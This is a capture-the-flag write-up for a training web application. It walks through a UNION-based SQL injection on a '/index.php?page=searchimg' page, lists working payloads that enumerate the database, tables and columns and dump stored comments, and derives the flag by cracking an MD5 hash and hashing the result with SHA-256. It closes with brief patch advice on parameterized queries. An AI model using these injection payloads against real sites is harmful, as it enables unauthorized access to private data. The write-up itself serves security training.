# Exploit
1. Visit the URL: `/index.php?page=searchimg`.
2. This is similar to the SQL injection exploit in `search_member_sql_inj_error_based`, but without error-based SQL feedback.
3. Reuse similar queries to extract information about the database name, table name, and column names. Use the following queries:

1 union all select 1,database() --> Member_images 1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database() --> list_images 1 union all select 1,group_concat(column_name) from Information_schema.columns where table_name=0x6c6973745f696d61676573 --> id,url,title,comment 1 union all select 1,group_concat(comment,0x0a) from list_images --> If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

- 0x6c6973745f696d61676573 stand for list_images 
- 0x0a is a newline character "when it passed as second argument it add new line between each concatenated value"

4. Decrypt the MD5 hash, which gives: **albatroz**.
5. Compute the SHA-256 checksum for "albatroz":

```bash
echo -n albatroz | shasum -a 256
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188  -
The resulting flag is: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188.
Patch
Prepare SQL statements using parameterized queries.
Sanitize user inputs by filtering special characters to prevent malicious inputs. """